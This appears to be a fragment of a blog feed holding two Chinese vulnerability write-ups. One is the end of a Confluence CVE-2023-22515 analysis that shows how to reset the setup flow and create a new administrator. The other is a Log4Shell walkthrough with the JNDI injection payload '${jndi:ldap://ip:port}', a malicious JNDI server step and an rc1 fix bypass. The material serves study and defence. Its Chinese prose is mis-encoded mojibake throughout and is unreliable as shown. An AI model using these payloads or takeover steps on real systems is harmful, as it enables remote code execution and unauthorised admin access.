&lt;p&gt;![image-20231012141836976](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012141836976.png)&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯å¦‚ä½•è®¾ç½®è¿™äº›å±æ€§å‘¢ï¼ŸæŸ¥çœ‹&lt;code&gt;interceptors&lt;/code&gt;ï¼Œå’Œå®˜æ–¹çš„æè¿°ï¼Œè¿™ä¸ª&lt;code&gt;SafeParametersInterceptor&lt;/code&gt;å¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼š&lt;/p&gt;
&lt;p&gt;![](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012194917943.png)&lt;/p&gt;
&lt;p&gt;![image-20231012153302736](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012153302736.png)&lt;/p&gt;
&lt;p&gt;æŠŠè¡¨å•å†…å®¹æ³¨å…¥åˆ°&lt;code&gt;action properties&lt;/code&gt;ï¼Œé‚£ä¹ˆå…«ä¹ä¸ç¦»åå°±æ˜¯è¿™ç©æ„äº†ï¼Œé‡Œé¢éƒ½æ˜¯ä¸€äº›å®‰å…¨æ£€æŸ¥ç›¸å…³çš„ï¼Œå°¤å…¶æ˜¯æ£€æŸ¥&lt;code&gt;@ParameterSafe&lt;/code&gt;è¿™ä¸ªæ³¨è§£ï¼Œå¹¶ä¸”æœ‰è¿™ä¹ˆä¸€æ®µ&lt;code&gt;doInterceptor&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012195013625](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012195013625.png)&lt;/p&gt;
&lt;p&gt;è¿™ä¸‹å¯å¥½äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å»çœ‹çˆ¶ç±»ï¼Œä½†æ˜¯ç‚¹äº†ä¸€ä¸‹ç«Ÿç„¶æç¤ºæˆ‘&lt;code&gt;Cannot find declaration to go to&lt;/code&gt;ç”±äºæ¯”è¾ƒæ‡’ï¼Œç›´æ¥ä¸Šgoogleæœç´¢ä¸€ä¸‹æ–‡æ¡£ï¼Œç„¶åä¸ŠGithubç¿»æºç å»äº†ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012161818082](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012161818082.png)&lt;/p&gt;
&lt;p&gt;![image-20231012160933343](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012160933343.png)&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°äº†å…·ä½“æºç åå°±æ˜ç™½äº†ï¼Œå‰é¢è·å–&lt;code&gt;action&lt;/code&gt;ä¿¡æ¯åä»…ä»…åˆ¤æ–­äº†&lt;code&gt;NoParameters&lt;/code&gt;å°±è¿›è¡Œäº†&lt;code&gt;setParameters&lt;/code&gt;ï¼Œè¿™å°±å¾ˆæ˜äº†äº†ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012162618100](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012162618100-1697122530365-2.png)&lt;/p&gt;
&lt;p&gt;strutsç³»åˆ—çš„æ¼æ´å¤„ç†æµç¨‹interceptorâ€”Action&lt;/p&gt;
&lt;p&gt;è¿™æ®µXMLé…ç½®å®šä¹‰äº†ä¸€ä¸ªåä¸º&lt;code&gt;params&lt;/code&gt;çš„æ‹¦æˆªå™¨ï¼Œå¹¶æŒ‡å®šäº†è¯¥æ‹¦æˆªå™¨çš„å…·ä½“å®ç°ç±»ä¸º&lt;code&gt;com.atlassian.xwork.interceptors.SafeParametersInterceptor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;![image-20231012173735463](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012173735463.png)&lt;/p&gt;
&lt;p&gt;ç„¶åå°±æ˜¯å¯»æ‰¾è§¦å‘ç‚¹ï¼Œç›´æ¥æœç´¢&lt;code&gt;params&lt;/code&gt;ï¼Œçœ‹æ¥ç¡®å®æœ‰æ‰€å‘ç°ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012173531182](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012173531182.png)&lt;/p&gt;
&lt;p&gt;![image-20231012173550112](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012173550112.png)&lt;/p&gt;
&lt;p&gt;![image-20231012204057094](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012204057094.png)&lt;/p&gt;
&lt;p&gt;çœ‹äº†çœ‹æ‰€æœ‰çš„&lt;code&gt;stack&lt;/code&gt;ï¼Œåªè¦ä¸‹é¢çš„&lt;code&gt;action&lt;/code&gt;ç”¨çš„ä¸æ˜¯&lt;code&gt;setupStack&lt;/code&gt;å°±éƒ½å¯ä»¥ä½¿ç”¨ï¼Œå¤šè¯•è¯•åº”è¯¥å°±å¯ä»¥äº†ï¼ˆæˆ‘å°è¯•åå‘ç°åªæœ‰&lt;code&gt;validatingStack&lt;/code&gt;æˆ–è€…ä»€ä¹ˆéƒ½ä¸å†™çš„ç”¨é»˜è®¤çš„æ‰å¯ä»¥æˆåŠŸï¼Œå…¶ä»–çš„å¯ä»¥è¿›å€’æ˜¯ï¼Œä½†æ˜¯æ²¡æ³•åˆ›å»ºç”¨æˆ·ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012204203122](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012204203122.png)&lt;/p&gt;
&lt;p&gt;åˆ°è¿™é‡Œæ¼æ´åˆ†æå°±ç»“æŸäº†ã€‚&lt;/p&gt;
&lt;h2&gt;æ¼æ´å¤ç°&lt;/h2&gt;
&lt;p&gt;å…ˆå¼„ä¸ªç¯å¢ƒï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012114259263](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012114259263.png)&lt;/p&gt;
&lt;p&gt;![image-20231012163733457](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012163733457.png)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlserver&lt;/code&gt;ç‰ˆæœ¬å¤ªä½ï¼Œç›´æ¥æ”¾å¼ƒå¤ç°ï¼ˆä¸æ˜¯&lt;/p&gt;
&lt;p&gt;æœ€åé€‰æ‹©å¼„ä¸ª&lt;code&gt;PostgreSQL&lt;/code&gt;æ¥ä»£æ›¿å§ï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012172942216](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012172942216.png)&lt;/p&gt;
&lt;p&gt;ç„¶åå°±æˆåŠŸè¿›å…¥åˆå§‹ç•Œé¢äº†ï¼Œæ‰“å¼€bpï¼Œç„¶åæµè§ˆå™¨è®¿é—®&lt;code&gt;/setup/setupadministrator-start.action&lt;/code&gt;å‘ç°å·²ç»æ²¡åŠæ³•è¿›å…¥æ³¨å†Œæµç¨‹äº†ï¼š&lt;/p&gt;
&lt;p&gt;![](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012204451547.png)&lt;/p&gt;
&lt;p&gt;è¦†ç›–å±æ€§ååˆ·æ–°ï¼Œå‘ç°å·²ç»å¯ä»¥é‡æ–°è®¾ç½®ç®¡ç†å‘˜äº†ï¼š&lt;/p&gt;
&lt;p&gt;![](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012210036843.png)&lt;/p&gt;
&lt;p&gt;æ–°å»ºå®Œæˆï¼ŒæŸ¥çœ‹ç»“æœï¼š&lt;/p&gt;
&lt;p&gt;![image-20231012205136650](./CVE-2023-22515 Critical Privilege Escalation Vulnerability in Atlassian&apos;s Confluence/image-20231012205136650.png)&lt;/p&gt;
&lt;p&gt;å…³äºRCEå·²ç»æœ‰å¸ˆå‚…æåˆ°äº†ï¼Œæˆ‘æ‰“ç®—å†çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ›´åŠ æ–¹ä¾¿çš„æ–¹å¼ï¼Œå¦‚æœæœ‰å‘ç°å†å‘æ–‡ã€‚&lt;/p&gt;
</content:encoded></item><item><title>Log4Shell</title><link>https://www.springkill.club/posts/log4shell/</link><guid isPermaLink="true">https://www.springkill.club/posts/log4shell/</guid><pubDate>Thu, 28 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;é…å¥—ä»£ç åœ¨ï¼š&lt;a href=&quot;https://github.com/springkill/top50vulns_2023&quot;&gt;top50vulns_2023&lt;/a&gt;é…åˆé£Ÿç”¨æ›´ä½³ï¼&lt;/p&gt;
&lt;h2&gt;æ¼æ´æˆå› &lt;/h2&gt;
&lt;p&gt;æœ¬æ¼æ´æ˜¯å› ä¸ºlog4jå®˜æ–¹æä¾›äº†ä¸€ä¸ªåä¸º&lt;a href=&quot;https://logging.apache.org/log4j/2.x/manual/lookups.html&quot;&gt;Message Lookup Substitution&lt;/a&gt;çš„åŠŸèƒ½ï¼Œæ­¤åŠŸèƒ½ä¼šåŠ¨æ€åœ°è·å–æŸäº›å†…å®¹ï¼š
å¦‚å­—ç¬¦ä¸²&lt;code&gt;Running ${java:runtime}&lt;/code&gt;ä¼šè¢«è§£æä¸º&lt;code&gt;Running Java version 1.8xxx&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;å®˜æ–¹æ–‡æ¡£ä¸­å¯¹æ­¤çš„éƒ¨åˆ†æè¿°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;The JavaLookup allows Java environment information to be retrieved in convenient preformatted strings using the &lt;code&gt;java:&lt;/code&gt; prefix.&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨å¦‚ä¸‹å†…å®¹å¯ä»¥æ£€ç´¢Javaç›¸å…³ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Key&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;version&lt;/td&gt;
&lt;td&gt;The short Java version, like:&lt;code&gt;Java version 1.7.0_67&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;runtime&lt;/td&gt;
&lt;td&gt;The Java runtime version, like:&lt;code&gt;Java(TM) SE Runtime Environment (build 1.7.0_67-b01) from Oracle Corporation&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vm&lt;/td&gt;
&lt;td&gt;The Java VM version, like:&lt;code&gt;Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;os&lt;/td&gt;
&lt;td&gt;The OS version, like:&lt;code&gt;Windows 7 6.1 Service Pack 1, architecture: amd64-64&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;locale&lt;/td&gt;
&lt;td&gt;System locale and file encoding information, like:&lt;code&gt;default locale: en_US, platform encoding: Cp1252&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hw&lt;/td&gt;
&lt;td&gt;Hardware information, like:&lt;code&gt;processors: 4, architecture: amd64-64, instruction sets: amd64&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;åŒæ—¶å®˜æ–¹ä¹Ÿæä¾›äº†JNDIåŠŸèƒ½æ¥è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼š&lt;/p&gt;
&lt;h3&gt;JNDI Lookup&lt;/h3&gt;
&lt;p&gt;As of Log4j 2.17.0 JNDI operations require that &lt;code&gt;log4j2.enableJndiLookup=true&lt;/code&gt; be set as a system property or the corresponding environment variable for this lookup to function. See the &lt;a href=&quot;https://logging.apache.org/log4j/2.x/manual/configuration.html#enableJndiLookup&quot;&gt;enableJndiLookup&lt;/a&gt; system property.&lt;/p&gt;
&lt;p&gt;The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp/env/, however if the key contains a &quot;:&quot; no prefix will be added.&lt;/p&gt;
&lt;p&gt;The JNDI Lookup only supports the java protocol or no protocol (as shown in the example below).&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å¼€å¯JNDIæ£€ç´¢ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;File name=&quot;Application&quot; fileName=&quot;application.log&quot;&amp;gt;  
    &amp;lt;PatternLayout&amp;gt;
        &amp;lt;pattern&amp;gt;%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n&amp;lt;/pattern&amp;gt;
    &amp;lt;/PatternLayout&amp;gt;
&amp;lt;/File&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹Ÿæ­£æ˜¯æä¾›äº†JNDIæŸ¥æ‰¾çš„åŠŸèƒ½ï¼Œå¯¼è‡´äº†æ¼æ´çš„å‡ºç°ã€‚&lt;/p&gt;
&lt;p&gt;å½“&lt;code&gt;JNDI&lt;/code&gt;ä¸ &lt;code&gt;LDAP&lt;/code&gt; åè®®æ­é…ä½¿ç”¨æ—¶ï¼Œå°†ä»è¿œç¨‹æºè·å–æŒ‡å®šçš„ Java ç±»å¹¶å°†å…¶ååºåˆ—åŒ–ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œè¯¥ç±»çš„ä¸€äº›ä»£ç ï¼Œé€ æˆååºåˆ—åŒ–æ”»å‡»ã€‚
payloadå½¢å¼ä¾‹å¦‚ï¼š&lt;code&gt;${jndi:ldap://ip:port}&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&amp;amp;&amp;amp;å¤ç°&lt;/h2&gt;
&lt;p&gt;å…ˆå†™ä¸€ä¸ªdemoæ¥å®ç°log4Shellã€‚&lt;/p&gt;
&lt;p&gt;åœ¨log4j2ä¸­å­˜åœ¨ä¸€ä¸ªæ¥å£åä¸ºStrLookupï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.apache.logging.log4j.core.lookup;

import org.apache.logging.log4j.core.LogEvent;

public interface StrLookup {
    String CATEGORY = &quot;Lookup&quot;;

    String lookup(String key);

    String lookup(LogEvent event, String key);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“åœ¨log4j2ä¸­ä½¿ç”¨äº†å¦‚&lt;code&gt;${prefix:key}&lt;/code&gt;çš„ç±»å‹æ—¶ï¼Œå°±ä¼šè°ƒç”¨ç›¸åº”çš„&lt;code&gt;StrLookup&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ¥å£è¢«ä»¥&lt;code&gt;Map&amp;lt;String,StrLookup&amp;gt;&lt;/code&gt;çš„æ–¹å¼å°è£…åœ¨äº†&lt;code&gt;Interpolator&lt;/code&gt;ä¸­ï¼Œå¯ä»¥åœ¨é¡¹ç›®ä»£ç çš„&lt;code&gt;æ–­ç‚¹1&lt;/code&gt;å¤„æ‰“æ–­ç‚¹è§‚å¯Ÿå°è£…åœ¨&lt;code&gt;Interpolator&lt;/code&gt;å†…éƒ¨çš„&lt;code&gt;StrLookup&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public Interpolator(final Map&amp;lt;String, String&amp;gt; properties) {
        this.strLookupMap = new HashMap();
        this.defaultLookup = new MapLookup((Map)(properties == null ? new HashMap() : properties));
        this.strLookupMap.put(&quot;log4j&quot;, new Log4jLookup());
        this.strLookupMap.put(&quot;sys&quot;, new SystemPropertiesLookup());
        this.strLookupMap.put(&quot;env&quot;, new EnvironmentLookup());
        this.strLookupMap.put(&quot;main&quot;, MainMapLookup.MAIN_SINGLETON);
        this.strLookupMap.put(&quot;marker&quot;, new MarkerLookup());
        this.strLookupMap.put(&quot;java&quot;, new JavaLookup());
        this.strLookupMap.put(&quot;lower&quot;, new LowerLookup());
        this.strLookupMap.put(&quot;upper&quot;, new UpperLookup());

        try {
            this.strLookupMap.put(&quot;jndi&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;, StrLookup.class));
        } catch (Exception | LinkageError var9) {
            this.handleError(&quot;jndi&quot;, var9);
        }

        try {
            this.strLookupMap.put(&quot;jvmrunargs&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;, StrLookup.class));
        } catch (Exception | LinkageError var8) {
            this.handleError(&quot;jvmrunargs&quot;, var8);
        }

        this.strLookupMap.put(&quot;date&quot;, new DateLookup());
        this.strLookupMap.put(&quot;ctx&quot;, new ContextMapLookup());
        if (Constants.IS_WEB_APP) {
            try {
                this.strLookupMap.put(&quot;web&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.web.WebLookup&quot;, StrLookup.class));
            } catch (Exception var7) {
                this.handleError(&quot;web&quot;, var7);
            }
        } else {
            LOGGER.debug(&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;);
        }

        try {
            this.strLookupMap.put(&quot;docker&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.docker.DockerLookup&quot;, StrLookup.class));
        } catch (Exception var6) {
            this.handleError(&quot;docker&quot;, var6);
        }

        try {
            this.strLookupMap.put(&quot;spring&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;, StrLookup.class));
        } catch (Exception var5) {
            this.handleError(&quot;spring&quot;, var5);
        }

        try {
            this.strLookupMap.put(&quot;kubernetes&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;, StrLookup.class));
        } catch (Exception var3) {
            this.handleError(&quot;kubernetes&quot;, var3);
        } catch (NoClassDefFoundError var4) {
            this.handleError(&quot;kubernetes&quot;, var4);
        }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928013525232-1695897805957-1-1695899839737-41.png&quot; alt=&quot;image-20230928013525232&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å½“&lt;code&gt;${prefix:key}&lt;/code&gt;ä¸­çš„&lt;code&gt;prefix&lt;/code&gt;ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œ&lt;code&gt;Interpolator&lt;/code&gt;ä¸­çš„&lt;code&gt;lookup&lt;/code&gt;æ–¹æ³•å°±ä¼šå»è°ƒç”¨&lt;code&gt;prefix&lt;/code&gt;å¯¹åº”çš„&lt;code&gt;StrLookup&lt;/code&gt;çš„&lt;code&gt;lookup&lt;/code&gt;æ–¹æ³•å»æŸ¥è¯¢keyæ‰€å¯¹åº”çš„å†…å®¹ï¼Œå½“&lt;code&gt;prefix&lt;/code&gt;ä¸º&lt;code&gt;jndi&lt;/code&gt;çš„æ—¶å€™å°±é€ æˆäº†JNDIæ³¨å…¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928020051845-1695897805957-2-1695899839737-42.png&quot; alt=&quot;image-20230928020051845&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928020841071-1695897805957-3-1695899839737-43.png&quot; alt=&quot;image-20230928020841071&quot; /&gt;&lt;/p&gt;
&lt;p&gt;æœ¬æ¬¡æ¼æ´å…³é”®åœ¨äºè½¬æ¢å™¨åç§°&lt;code&gt;msg&lt;/code&gt;å¯¹åº”çš„æ’ä»¶å®ä¾‹&lt;code&gt;MessagePatternConverter&lt;/code&gt;å¯¹äºæ—¥å¿—ä¸­çš„æ¶ˆæ¯å†…å®¹å¤„ç†å­˜åœ¨é—®é¢˜ï¼Œåœ¨å¤§å¤šæ•°åœºæ™¯ä¸‹è¿™éƒ¨åˆ†æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚&lt;code&gt;MessagePatternConverter&lt;/code&gt;ä¼šå°†æ—¥å¿—ä¸­çš„æ¶ˆæ¯å†…å®¹ä¸º&lt;code&gt;${prefix:key}&lt;/code&gt;æ ¼å¼çš„å­—ç¬¦ä¸²è¿›è¡Œè§£æè½¬æ¢ï¼Œè¯»å–ç¯å¢ƒå˜é‡ã€‚æ­¤æ—¶ä¸ºjndiçš„æ–¹å¼çš„è¯ï¼Œå°±å­˜åœ¨æ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;è¯¦ç»†æµç¨‹å¦‚ä¸‹ï¼Œå½“log4jå¼€å§‹è¿›è¡Œå¤„ç†çš„æ—¶å€™ï¼Œ&lt;code&gt;AbstractOutputStreamAppender&lt;/code&gt;ç±»çš„&lt;code&gt;directEncodeEvent&lt;/code&gt;æ–¹æ³•å…ˆè·å–å½“å‰ä½¿ç”¨çš„å¸ƒå±€ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„&lt;code&gt;encode&lt;/code&gt;æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928125229635-1695899839732-24.png&quot; alt=&quot;image-20230928125229635&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿›å…¥é»˜è®¤å¸ƒå±€&lt;code&gt;PatternLayout&lt;/code&gt;ç±»çš„&lt;code&gt;encode&lt;/code&gt;æ–¹æ³•ï¼Œ&lt;code&gt;encode&lt;/code&gt;è°ƒç”¨&lt;code&gt;toText&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928125540683-1695899839732-25.png&quot; alt=&quot;image-20230928125540683&quot; /&gt;&lt;/p&gt;
&lt;p&gt;toTextä¸­ä¼šè·å–å¯¹åº”çš„&lt;code&gt;serialize&lt;/code&gt;rç„¶åè°ƒç”¨&lt;code&gt;serializer&lt;/code&gt;çš„&lt;code&gt;toSerializable&lt;/code&gt;æ–¹æ³•&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928125705420-1695899839732-26.png&quot; alt=&quot;image-20230928125705420&quot; /&gt;&lt;/p&gt;
&lt;p&gt;éšåè¿›å…¥&lt;code&gt;toSerializable&lt;/code&gt;åä¼šåœ¨å¾ªç¯ä¸­ä½¿ç”¨åˆé€‚çš„&lt;code&gt;converter&lt;/code&gt;æ¥å¤„ç†ä¼ å…¥çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928135519938-1695899839732-27.png&quot; alt=&quot;image-20230928135519938&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928140306447-1695899839732-28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­å¾€ä¸‹è·Ÿè¿›çš„æ—¶å€™ä¼šçœ‹åˆ°åœ¨&lt;code&gt;MessagePatternConverter&lt;/code&gt;ç±»ä¸­å¯¹ä¼ å…¥çš„&lt;code&gt;${prefix:key}&lt;/code&gt;è¿›è¡Œäº†å¤„ç†ï¼Œ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928141108185-1695899839732-29.png&quot; alt=&quot;image-20230928141108185&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç»†å¿ƒçš„å¸ˆå‚…ä»¬å¯èƒ½çœ‹åˆ°äº†offset=68å’Œcount=99è¿™æ ·çš„å·®åˆ«ï¼Œä¸­é—´å·®äº†31ä½çš„é•¿åº¦ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928141812113-1695899839732-30.png&quot; alt=&quot;image-20230928141812113&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928141752845-1695899839732-31.png&quot; alt=&quot;image-20230928141752845&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯å› ä¸ºåœ¨ç»è¿‡äº†&lt;code&gt;formatTo&lt;/code&gt;æ–¹æ³•åæˆªå–äº†&lt;code&gt;${prefix:key}&lt;/code&gt;çš„å€¼ï¼Œæ‰€ä»¥é•¿åº¦å‡å°‘äº†ï¼Œæˆ‘è¿™é‡Œæ˜¯31ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928142544264-1695899839733-32.png&quot; alt=&quot;image-20230928142544264&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928142701509-1695899839733-33.png&quot; alt=&quot;image-20230928142701509&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928142939212-1695899839733-34.png&quot; alt=&quot;image-20230928142939212&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928143110502-1695899839733-35.png&quot; alt=&quot;image-20230928143110502&quot; /&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆlog4jæˆªå–è¿™éƒ¨åˆ†çš„å†…å®¹åšä»€ä¹ˆå‘¢ï¼Œèµ°åˆ°è¿™æ®µ&lt;code&gt;if&lt;/code&gt;çš„æœ€åæµç¨‹ï¼Œæ˜¯ä¸€ä¸ª&lt;code&gt;append&lt;/code&gt;ï¼ˆå½“ç„¶å‰é¢è¿˜æœ‰ä¸ª&lt;code&gt;substring&lt;/code&gt;ï¼‰,è¦appendçš„å†…å®¹å°±è¦ç”±log4jå»æŸ¥æ‰¾äº†ï¼Œå‰©ä¸‹çš„ä¸Šé¢å·²ç»è¯´è¿‡äº†ï¼Œé€‰å–åˆé€‚çš„&lt;code&gt;StrLookup&lt;/code&gt;çš„&lt;code&gt;lookup&lt;/code&gt;æ–¹æ³•å»æŸ¥è¯¢&lt;code&gt;key&lt;/code&gt;æ‰€å¯¹åº”çš„å†…å®¹ï¼Œæœ€ç»ˆè°ƒç”¨&lt;code&gt;JndiMananger&lt;/code&gt;ä¸­çš„&lt;code&gt;lookup&lt;/code&gt;åè°ƒç”¨åˆ°&lt;code&gt;ldap&lt;/code&gt;çš„&lt;code&gt;lookup&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928150520456-1695899839733-36.png&quot; alt=&quot;image-20230928150520456&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928145907568-1695899839733-37.png&quot; alt=&quot;image-20230928145907568&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928150108133-1695899839733-38.png&quot; alt=&quot;image-20230928150108133&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªæ¶æ„çš„JNDIæœåŠ¡ï¼Œå¹¶æ›¿æ¢åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928182725540-1695899839733-39.png&quot; alt=&quot;image-20230928182725540&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928183008647-1695899839733-40.png&quot; alt=&quot;image-20230928183008647&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;å…³äºç»•è¿‡&lt;/h2&gt;
&lt;p&gt;rc1çš„ä¿®å¤å¯ä»¥è¢«ç»•è¿‡ï¼Œä½†æ˜¯éœ€è¦å¼€å‘äººå‘˜æ‰‹å·¥å¼€å¯&lt;code&gt;log4j2.formatMsgLookups=true&lt;/code&gt;åˆæˆ–è€…é…ç½®æ–‡ä»¶ä¸­è‡ªå·±å†™&lt;code&gt;%msg{lookups}%n&quot;&lt;/code&gt;ç±»ä¼¼çš„å¸ƒå±€æ¨¡å¼ï¼Œä½†æ˜¯å¯¹äºå­¦ä¹ æ¥è¯´è¿˜æ˜¯æœ‰æ„ä¹‰çš„ï¼Œæ‰€ä»¥ç®€å•è¯´ä¸‹ï¼Œå¯¹äºå¼€å¯äº†è¿™äº›é…ç½®çš„log4j2-rc1ï¼Œå…¶å†…éƒ¨ä»ç„¶åŠ äº†ä¸€äº›ç™½åå•å’Œå…¶ä»–çš„ä¸¥æ ¼æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœæŠ›å‡ºäº†&lt;code&gt;URISyntaxException&lt;/code&gt;å¼‚å¸¸ï¼Œé‚£ä¹ˆå°±ä¼šç»•è¿‡è¿™äº›é™åˆ¶ï¼Œcatchå¼‚å¸¸åé‡æ–°è¿›å…¥å‰é¢JNDIæ³¨å…¥çš„æµç¨‹ã€‚&lt;/p&gt;
